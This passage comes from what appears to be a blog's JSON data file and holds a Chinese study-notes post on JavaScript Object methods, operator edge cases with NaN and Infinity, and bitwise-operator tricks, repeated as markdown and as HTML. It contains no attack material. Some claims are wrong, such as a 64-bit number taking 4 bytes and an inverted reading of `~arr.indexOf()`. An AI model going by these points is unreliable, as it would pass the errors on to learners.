20;\nvar res = ++m +1 // res = 22\n\n```\n\n3. 逻辑与&&\n有一个操作数不是布尔值的时候：\n对象：\n\n- 第一个值为对象，返回第二个值\n- 第二个值为对象，第一个值计算结果为true时返回第二个数\n- 两个值都是对象，返回第二个值\n\n其他特殊：\n\n- 有一个为NaN、undefined、null，则结果分别为NaN、undefined、null，这三个值相互&&，则返回第一个值：\n```\nNaN && undefined;  // NaN\nundefined && NaN;  // undefined\nnull && NaN;       // null\nNaN && null;       //NaN\n```\n\n逻辑与是短路操作，如果第一个值为false，就不对第二个值求值\n\n4. 逻辑或 ||\n有一个操作数不是布尔值时：\n对象：\n\n- 第一个值为对象，返回第一个值\n- 第二个值为对象，如果第一个值为false，返回第二个值\n- 两值都为对象，返回第一个\n\n其他特殊：\n\n- 两个值都是null、undefined、NaN，那么分别返回null、undefined、NaN\n- null、undefined、NaN之间相互或||运算，返回第二个值\n```\nNaN || null; // null\nnull || NaN; // NaN\n```\n\n5. 乘性操作符\n乘*、除/、取余%，如果操作数不是数值，会先用 **Number()**转换成数值\n乘法特殊点的：\n\n- Infinity * 0 = NaN\n- Infinity乘以非0，是Infinity或者-Infinity\n\n除法特殊点的：\n\n- Infinity / Infinity = NaN\n- 0 / 0 = NaN\n取余特殊的太多，不记了\n\n6. 加性操作符\n\n- Infinity+ (-Infinity) = NaN\n- -Infinity - (-Infinity) = NaN\n- Infinity - Infinity = NaN\n\n7. 比较操作符>、<、==\n\n- NaN与任何值进行比较大小，结果都是false：\n```\nNaN > \"a\"; //false\nNaN <= \"a\"; //false\n```\n\n相等操作符:\n\n- null 和undefined\n```\nnull == undefined； // true\nnull == 0;          // false\nundefined == 0;     // false\n```\n\n- NaN与任何值比较相等，都是false，比较不等都是true：\n```\nNaN == null // false\nNaN != null // true\nNaN != NaN  // true\n```\n\n- 如果两个都是对象，如果这两个指向同一个对象，返回true，否则false\n\n\n## 3.7 位操作 ##\n\n### 3.7.1 位操作基础知识 ###\n1. JS的数字都使用64位格式存储，所以一个数字是4Byte，此外一个英文字母是1Byte，一个汉字是2Byte，基本数据类型变量8Byte\n2. 机器层面是64位，使用JS实际操作时，按照32位操作，有符号整数，左起第一位是符号位，其余为数值位，无符号整数，32位都是数值位，因此数值更大\n3. 负数存储使用二进制补码，求二进制补码的过程：\n\n- 求这个数绝对值的二进制码\n- 求二进制码的反码(0变1,1变0)\n- 将反码加一\n4. 负数的二进制补码形式只在机器存储层面表现，使用toString()输出二进制字符串时，对于负数，得到的只是绝对值二进制码前面加符号\n5. 机器层面把64位存储转换成32位，JS操作完再把32位转成64位存储，这个过程导致副作用是：对NaN和Infinity应用位操作时，都被当成0处理\n6. **位操作都只对整数有效，如果是小数，先舍弃小数，再进行位操作运算**\n\n### 3.7.2 位操作运算 ###\n\n#### 1位操作符列表 ####\n| 操作符 |        英文名         |   中文名   |          用法          |\n|--------|-----------------------|------------|------------------------|\n| ~      | NOT                   | 按位非     | `~i = -(i+1)`，求反码值 |\n| &      | AND                   | 按位与     | `var res = 3 & 7`      |\n| ^      | XOR                   | 按位异或   | `var res = 25 ^ 3`      |\n| <<     | LEFT SHIFT            | 左移       | `var res = 2 << 5`       |\n| >>     | RIGHT SHIFT           | 有符号右移 | `var res = 64 >> 5`      |\n| >>>    | ZERO-FILL RIGHT SHIFT | 无符号右移 | `var res = 64 >>> 5`     |\n\n按位或的符号与MD表格冲突，列在表格外：\n`|`   OR    按位或    `var res = 3 | 7`  \n\n#### 2位操作符应用场景^2^3^4： ####\n列举常用的比较简单的使用场景，尽量少用，会使阅读者理解困难，主要是当别人装13时，自己不至于蒙圈\n\n1. ~-1 = 0，配合利用arr.indexOf(xxx) = -1代表arr中不存在xxx\n```\nvar arr = ['aa', 'bb'] ;\nif(~arr.indexOf(xxx)) {}  // 相当于if(0)，即if(arr中不存在xxx)\n```\n2. 求整，相当于Math.floor：\n```\nvar num1 = ~~1.1; // 1 \nvar num2 = ~~1.9; // 1 \nvar num3 = 1.9|0; // 1\n```\n3. & 判断奇偶：\n```\nfunction isOdd(n){\n    return n & 1?true:false;\n}\nisOdd(3); // true\nisOdd(4); // false\n```\n4. <<和>>2的幂运算\n```\nfunction power(n){\n    return 1 << n; // 求2的n次方\n}\npower(5); //32\n\nconsole.log(32>>1); //求32的一半\n```\n5. `>>>`判断数的正负\n```\nfunction isPos(n){\n   return n === (n>>>0) ? true:false;\n}\nisPos(-1); // false\nisPos(1); // true\n```\n-1>>>0虽然没有向右移动位数，但-1的二进制码已经变成了正数的二进制码：\n所以-1>>>0的值为4294967295。\n6. 或者随机颜色色值，其实用到位运算的就是一个取整，使用Math.floor是一样的\n`'#'+(Math.random()*0xFFFFFF|0).toString(16)`\n\n\n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript3](http://luckymona.github.io/2016/09/17/read-book-professional-javascript3)\n\nReference：\n\n^2:[js中位运算的运用](http://www.tuicool.com/articles/VJryYb)\n^3:[JS中位操作符有什么特殊作用](http://www.kqiqi.com/knowledge/program/1079.html)\n^4:[小代码大学问之JavaScript位运算](http://www.mmfei.com/?p=299)\n\n\n\n\n","slug":"read-book-professional-javascript3","published":1,"updated":"2018-05-07T10:29:59.600Z","layout":"post","photos":[],"link":"","_id":"cjgw444a000298d95sar4qowm","content":"<p>摘要：</p>\n<ol>\n<li>一切对象都继承自Object，但不包括宿主对象，如DOM对象、BOM对象，宿主环境定义宿主对象</li>\n<li>所有对象都有的方法有：constructor、isPrototypeOf、hasOwnProperty、toString; valueOf、toLocalString、propertyIsEnumberable</li>\n<li>对象使用toString()一般得到”[object Object]”</li>\n<li>除null和undefined的数据类型可以使用操作符；</li>\n<li>Object类型使用操作符时会先使用toString或者valueOf转换为字符串，如果需要的是数值，再使用Number转换成数值，之后进行操作</li>\n<li>++i与i++的区别：i值改变，与所在语句求值，这两个顺序的不同</li>\n<li>加性操作、乘性操作中，涉及NaN、0、Infinity的特殊状况</li>\n<li>逻辑与&amp;&amp;或||，短路操作，当有一个值是对象时，结果怎样，当有一个值null、undefined、NaN时，结果怎样</li>\n<li>位操作~ &amp; | ^ &lt;&lt; &gt;&gt; &gt;&gt;&gt;非与或，异或，左移，有符号右移，无符号右移</li>\n<li>位操作常用场景：~与indexOf配合、求整、判奇偶、判正负、随机颜色</li>\n</ol>\n<a id=\"more\"></a>\n<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript3\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript3</a></p>\n</blockquote>\n<h2 id=\"3-5-Object\"><a href=\"#3-5-Object\" class=\"headerlink\" title=\"3.5 Object\"></a>3.5 Object</h2><ol>\n<li>对象就是一组数据和功能的组合；</li>\n<li>Object类型是所有对象的祖先，但不是宿主对象的祖先，例如宿主环境浏览器中的BOM和DOM对象是由宿主实现和定义的</li>\n<li><p>除了宿主对象，其他对象全都拥有有这些方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var o = new Object; //不传参时，可以不用圆括号，但不推荐这种写法</span><br><span class=\"line\">console.log(); //打印以下值：</span><br><span class=\"line\"></span><br><span class=\"line\">o.constructor();</span><br><span class=\"line\">o.hasOwnProperty(propertyName);</span><br><span class=\"line\">o.isPrototypeOf(object);</span><br><span class=\"line\"></span><br><span class=\"line\">o.toString();       // 返回[object NativeConstructorName]，可以用于对象类型检测</span><br><span class=\"line\">o.toLocalString();  // 基础功能类似toString，返回的字符串与执行环境的地理地区对应，可用于Date对象，输出以当地时间格式表示的字符串</span><br><span class=\"line\">o.valueOf();        //</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">o.propertyIsEnumberable(propertyName); //不常用</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>对Object使用toString()方法，通常会得到’[object Object]’，也可以这样用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var o = &#123; toString: function()&#123;</span><br><span class=\"line\">        return -1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(o.toString()); //-1</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"3-6-操作符\"><a href=\"#3-6-操作符\" class=\"headerlink\" title=\"3.6 操作符\"></a>3.6 操作符</h2><p>包括：算数操作符、位操作符、关系操作符、相等操作符，这些操作符均可以应用于除null和undefined之外的数据类型，操作符应用于Object时，会先调用toString()或valueOf()转换成字符串，以取得可以操作的值</p>\n<ol>\n<li>使用+、-操作时会先转换数据类型，<code>1+ &quot;&quot; = &quot;1&quot;; 1-&quot;&quot; = 1;</code></li>\n<li><p>++i和i++的区别在于，所在语句求值之前改变i，还是在语句求值之后，–i和i–同理：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var i=0;</span><br><span class=\"line\">console.log(i++) // 0 </span><br><span class=\"line\"></span><br><span class=\"line\">var i= 0;</span><br><span class=\"line\">console.log(++i); // 1</span><br><span class=\"line\"></span><br><span class=\"line\">var j = 20;</span><br><span class=\"line\">var res = j++ + 1; // res = 21</span><br><span class=\"line\"></span><br><span class=\"line\">var m = 20;</span><br><span class=\"line\">var res = ++m +1 // res = 22</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>逻辑与&amp;&amp;<br>有一个操作数不是布尔值的时候：<br>对象：</p>\n</li>\n</ol>\n<ul>\n<li>第一个值为对象，返回第二个值</li>\n<li>第二个值为对象，第一个值计算结果为true时返回第二个数</li>\n<li>两个值都是对象，返回第二个值</li>\n</ul>\n<p>其他特殊：</p>\n<ul>\n<li>有一个为NaN、undefined、null，则结果分别为NaN、undefined、null，这三个值相互&amp;&amp;，则返回第一个值：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN &amp;&amp; undefined;  // NaN</span><br><span class=\"line\">undefined &amp;&amp; NaN;  // undefined</span><br><span class=\"line\">null &amp;&amp; NaN;       // null</span><br><span class=\"line\">NaN &amp;&amp; null;       //NaN</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>逻辑与是短路操作，如果第一个值为false，就不对第二个值求值</p>\n<ol start=\"4\">\n<li>逻辑或 ||<br>有一个操作数不是布尔值时：<br>对象：</li>\n</ol>\n<ul>\n<li>第一个值为对象，返回第一个值</li>\n<li>第二个值为对象，如果第一个值为false，返回第二个值</li>\n<li>两值都为对象，返回第一个</li>\n</ul>\n<p>其他特殊：</p>\n<ul>\n<li>两个值都是null、undefined、NaN，那么分别返回null、undefined、NaN</li>\n<li>null、undefined、NaN之间相互或||运算，返回第二个值<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN || null; // null</span><br><span class=\"line\">null || NaN; // NaN</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol start=\"5\">\n<li>乘性操作符<br>乘*、除/、取余%，如果操作数不是数值，会先用 <strong>Number()</strong>转换成数值<br>乘法特殊点的：</li>\n</ol>\n<ul>\n<li>Infinity * 0 = NaN</li>\n<li>Infinity乘以非0，是Infinity或者-Infinity</li>\n</ul>\n<p>除法特殊点的：</p>\n<ul>\n<li>Infinity / Infinity = NaN</li>\n<li>0 / 0 = NaN<br>取余特殊的太多，不记了</li>\n</ul>\n<ol start=\"6\">\n<li>加性操作符</li>\n</ol>\n<ul>\n<li>Infinity+ (-Infinity) = NaN</li>\n<li>-Infinity - (-Infinity) = NaN</li>\n<li>Infinity - Infinity = NaN</li>\n</ul>\n<ol start=\"7\">\n<li>比较操作符&gt;、&lt;、==</li>\n</ol>\n<ul>\n<li>NaN与任何值进行比较大小，结果都是false：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN &gt; &quot;a&quot;; //false</span><br><span class=\"line\">NaN &lt;= &quot;a&quot;; //false</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>相等操作符:</p>\n<ul>\n<li><p>null 和undefined</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">null == undefined； // true</span><br><span class=\"line\">null == 0;          // false</span><br><span class=\"line\">undefined == 0;     // false</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>NaN与任何值比较相等，都是false，比较不等都是true：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN == null // false</span><br><span class=\"line\">NaN != null // true</span><br><span class=\"line\">NaN != NaN  // true</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果两个都是对象，如果这两个指向同一个对象，返回true，否则false</p>\n</li>\n</ul>\n<h2 id=\"3-7-位操作\"><a href=\"#3-7-位操作\" class=\"headerlink\" title=\"3.7 位操作\"></a>3.7 位操作</h2><h3 id=\"3-7-1-位操作基础知识\"><a href=\"#3-7-1-位操作基础知识\" class=\"headerlink\" title=\"3.7.1 位操作基础知识\"></a>3.7.1 位操作基础知识</h3><ol>\n<li>JS的数字都使用64位格式存储，所以一个数字是4Byte，此外一个英文字母是1Byte，一个汉字是2Byte，基本数据类型变量8Byte</li>\n<li>机器层面是64位，使用JS实际操作时，按照32位操作，有符号整数，左起第一位是符号位，其余为数值位，无符号整数，32位都是数值位，因此数值更大</li>\n<li>负数存储使用二进制补码，求二进制补码的过程：</li>\n</ol>\n<ul>\n<li>求这个数绝对值的二进制码</li>\n<li>求二进制码的反码(0变1,1变0)</li>\n<li>将反码加一</li>\n</ul>\n<ol start=\"4\">\n<li>负数的二进制补码形式只在机器存储层面表现，使用toString()输出二进制字符串时，对于负数，得到的只是绝对值二进制码前面加符号</li>\n<li>机器层面把64位存储转换成32位，JS操作完再把32位转成64位存储，这个过程导致副作用是：对NaN和Infinity应用位操作时，都被当成0处理</li>\n<li><strong>位操作都只对整数有效，如果是小数，先舍弃小数，再进行位操作运算</strong></li>\n</ol>\n<h3 id=\"3-7-2-位操作运算\"><a href=\"#3-7-2-位操作运算\" class=\"headerlink\" title=\"3.7.2 位操作运算\"></a>3.7.2 位操作运算</h3><h4 id=\"1位操作符列表\"><a href=\"#1位操作符列表\" class=\"headerlink\" title=\"1位操作符列表\"></a>1位操作符列表</h4><table>\n<thead>\n<tr>\n<th>操作符</th>\n<th>英文名</th>\n<th>中文名</th>\n<th>用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>~</td>\n<td>NOT</td>\n<td>按位非</td>\n<td><code>~i = -(i+1)</code>，求反码值</td>\n</tr>\n<tr>\n<td>&amp;</td>\n<td>AND</td>\n<td>按位与</td>\n<td><code>var res = 3 &amp; 7</code></td>\n</tr>\n<tr>\n<td>^</td>\n<td>XOR</td>\n<td>按位异或</td>\n<td><code>var res = 25 ^ 3</code></td>\n</tr>\n<tr>\n<td>&lt;&lt;</td>\n<td>LEFT SHIFT</td>\n<td>左移</td>\n<td><code>var res = 2 &lt;&lt; 5</code></td>\n</tr>\n<tr>\n<td>&gt;&gt;</td>\n<td>RIGHT SHIFT</td>\n<td>有符号右移</td>\n<td><code>var res = 64 &gt;&gt; 5</code></td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt;</td>\n<td>ZERO-FILL RIGHT SHIFT</td>\n<td>无符号右移</td>\n<td><code>var res = 64 &gt;&gt;&gt; 5</code></td>\n</tr>\n</tbody>\n</table>\n<p>按位或的符号与MD表格冲突，列在表格外：<br><code>|</code>   OR    按位或    <code>var res = 3 | 7</code>  </p>\n<h4 id=\"2位操作符应用场景-2-3-4：\"><a href=\"#2位操作符应用场景-2-3-4：\" class=\"headerlink\" title=\"2位操作符应用场景^2^3^4：\"></a>2位操作符应用场景^2^3^4：</h4><p>列举常用的比较简单的使用场景，尽量少用，会使阅读者理解困难，主要是当别人装13时，自己不至于蒙圈</p>\n<ol>\n<li><p>~-1 = 0，配合利用arr.indexOf(xxx) = -1代表arr中不存在xxx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr = [&apos;aa&apos;, &apos;bb&apos;] ;</span><br><span class=\"line\">if(~arr.indexOf(xxx)) &#123;&#125;  // 相当于if(0)，即if(arr中不存在xxx)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>求整，相当于Math.floor：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num1 = ~~1.1; // 1 </span><br><span class=\"line\">var num2 = ~~1.9; // 1 </span><br><span class=\"line\">var num3 = 1.9|0; // 1</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>&amp; 判断奇偶：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isOdd(n)&#123;</span><br><span class=\"line\">    return n &amp; 1?true:false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">isOdd(3); // true</span><br><span class=\"line\">isOdd(4); // false</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>&lt;&lt;和&gt;&gt;2的幂运算</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function power(n)&#123;</span><br><span class=\"line\">    return 1 &lt;&lt; n; // 求2的n次方</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">power(5); //32</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(32&gt;&gt;1); //求32的一半</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>&gt;&gt;&gt;</code>判断数的正负</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isPos(n)&#123;</span><br><span class=\"line\">   return n === (n&gt;&gt;&gt;0) ? true:false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">isPos(-1); // false</span><br><span class=\"line\">isPos(1); // true</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>-1&gt;&gt;&gt;0虽然没有向右移动位数，但-1的二进制码已经变成了正数的二进制码：<br>所以-1&gt;&gt;&gt;0的值为4294967295。</p>\n<ol start=\"6\">\n<li>或者随机颜色色值，其实用到位运算的就是一个取整，使用Math.floor是一样的<br><code>&#39;#&#39;+(Math.random()*0xFFFFFF|0).toString(16)</code></li>\n</ol>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript3\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript3</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^2:<a href=\"http://www.tuicool.com/articles/VJryYb\" target=\"_blank\" rel=\"noopener\">js中位运算的运用</a><br>^3:<a href=\"http://www.kqiqi.com/knowledge/program/1079.html\" target=\"_blank\" rel=\"noopener\">JS中位操作符有什么特殊作用</a><br>^4:<a href=\"http://www.mmfei.com/?p=299\" target=\"_blank\" rel=\"noopener\">小代码大学问之JavaScript位运算</a></p>\n","site":{"data":{}},"excerpt":"<p>摘要：</p>\n<ol>\n<li>一切对象都继承自Object，但不包括宿主对象，如DOM对象、BOM对象，宿主环境定义宿主对象</li>\n<li>所有对象都有的方法有：constructor、isPrototypeOf、hasOwnProperty、toString; valueOf、toLocalString、propertyIsEnumberable</li>\n<li>对象使用toString()一般得到”[object Object]”</li>\n<li>除null和undefined的数据类型可以使用操作符；</li>\n<li>Object类型使用操作符时会先使用toString或者valueOf转换为字符串，如果需要的是数值，再使用Number转换成数值，之后进行操作</li>\n<li>++i与i++的区别：i值改变，与所在语句求值，这两个顺序的不同</li>\n<li>加性操作、乘性操作中，涉及NaN、0、Infinity的特殊状况</li>\n<li>逻辑与&amp;&amp;或||，短路操作，当有一个值是对象时，结果怎样，当有一个值null、undefined、NaN时，结果怎样</li>\n<li>位操作~ &amp; | ^ &lt;&lt; &gt;&gt; &gt;&gt;&gt;非与或，异或，左移，有符号右移，无符号右移</li>\n<li>位操作常用场景：~与indexOf配合、求整、判奇偶、判正负、随机颜色</li>\n</ol>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript3\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript3</a></p>\n</blockquote>\n<h2 id=\"3-5-Object\"><a href=\"#3-5-Object\" class=\"headerlink\" title=\"3.5 Object\"></a>3.5 Object</h2><ol>\n<li>对象就是一组数据和功能的组合；</li>\n<li>Object类型是所有对象的祖先，但不是宿主对象的祖先，例如宿主环境浏览器中的BOM和DOM对象是由宿主实现和定义的</li>\n<li><p>除了宿主对象，其他对象全都拥有有这些方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var o = new Object; //不传参时，可以不用圆括号，但不推荐这种写法</span><br><span class=\"line\">console.log(); //打印以下值：</span><br><span class=\"line\"></span><br><span class=\"line\">o.constructor();</span><br><span class=\"line\">o.hasOwnProperty(propertyName);</span><br><span class=\"line\">o.isPrototypeOf(object);</span><br><span class=\"line\"></span><br><span class=\"line\">o.toString();       // 返回[object NativeConstructorName]，可以用于对象类型检测</span><br><span class=\"line\">o.toLocalString();  // 基础功能类似toString，返回的字符串与执行环境的地理地区对应，可用于Date对象，输出以当地时间格式表示的字符串</span><br><span class=\"line\">o.valueOf();        //</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">o.propertyIsEnumberable(propertyName); //不常用</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>对Object使用toString()方法，通常会得到’[object Object]’，也可以这样用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var o = &#123; toString: function()&#123;</span><br><span class=\"line\">        return -1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(o.toString()); //-1</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"3-6-操作符\"><a href=\"#3-6-操作符\" class=\"headerlink\" title=\"3.6 操作符\"></a>3.6 操作符</h2><p>包括：算数操作符、位操作符、关系操作符、相等操作符，这些操作符均可以应用于除null和undefined之外的数据类型，操作符应用于Object时，会先调用toString()或valueOf()转换成字符串，以取得可以操作的值</p>\n<ol>\n<li>使用+、-操作时会先转换数据类型，<code>1+ &quot;&quot; = &quot;1&quot;; 1-&quot;&quot; = 1;</code></li>\n<li><p>++i和i++的区别在于，所在语句求值之前改变i，还是在语句求值之后，–i和i–同理：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var i=0;</span><br><span class=\"line\">console.log(i++) // 0 </span><br><span class=\"line\"></span><br><span class=\"line\">var i= 0;</span><br><span class=\"line\">console.log(++i); // 1</span><br><span class=\"line\"></span><br><span class=\"line\">var j = 20;</span><br><span class=\"line\">var res = j++ + 1; // res = 21</span><br><span class=\"line\"></span><br><span class=\"line\">var m = 20;</span><br><span class=\"line\">var res = ++m +1 // res = 22</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>逻辑与&amp;&amp;<br>有一个操作数不是布尔值的时候：<br>对象：</p>\n</li>\n</ol>\n<ul>\n<li>第一个值为对象，返回第二个值</li>\n<li>第二个值为对象，第一个值计算结果为true时返回第二个数</li>\n<li>两个值都是对象，返回第二个值</li>\n</ul>\n<p>其他特殊：</p>\n<ul>\n<li>有一个为NaN、undefined、null，则结果分别为NaN、undefined、null，这三个值相互&amp;&amp;，则返回第一个值：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN &amp;&amp; undefined;  // NaN</span><br><span class=\"line\">undefined &amp;&amp; NaN;  // undefined</span><br><span class=\"line\">null &amp;&amp; NaN;       // null</span><br><span class=\"line\">NaN &amp;&amp; null;       //NaN</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>逻辑与是短路操作，如果第一个值为false，就不对第二个值求值</p>\n<ol start=\"4\">\n<li>逻辑或 ||<br>有一个操作数不是布尔值时：<br>对象：</li>\n</ol>\n<ul>\n<li>第一个值为对象，返回第一个值</li>\n<li>第二个值为对象，如果第一个值为false，返回第二个值</li>\n<li>两值都为对象，返回第一个</li>\n</ul>\n<p>其他特殊：</p>\n<ul>\n<li>两个值都是null、undefined、NaN，那么分别返回null、undefined、NaN</li>\n<li>null、undefined、NaN之间相互或||运算，返回第二个值<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN || null; // null</span><br><span class=\"line\">null || NaN; // NaN</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol start=\"5\">\n<li>乘性操作符<br>乘*、除/、取余%，如果操作数不是数值，会先用 <strong>Number()</strong>转换成数值<br>乘法特殊点的：</li>\n</ol>\n<ul>\n<li>Infinity * 0 = NaN</li>\n<li>Infinity乘以非0，是Infinity或者-Infinity</li>\n</ul>\n<p>除法特殊点的：</p>\n<ul>\n<li>Infinity / Infinity = NaN</li>\n<li>0 / 0 = NaN<br>取余特殊的太多，不记了</li>\n</ul>\n<ol start=\"6\">\n<li>加性操作符</li>\n</ol>\n<ul>\n<li>Infinity+ (-Infinity) = NaN</li>\n<li>-Infinity - (-Infinity) = NaN</li>\n<li>Infinity - Infinity = NaN</li>\n</ul>\n<ol start=\"7\">\n<li>比较操作符&gt;、&lt;、==</li>\n</ol>\n<ul>\n<li>NaN与任何值进行比较大小，结果都是false：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NaN &gt; &quot;a&quot;; //false</span><br><span class=\"line\">NaN &lt;= &quot;a&quot;; //false</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>相等操作符:</p>\n<ul>\n<li><p>null 和undefined</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 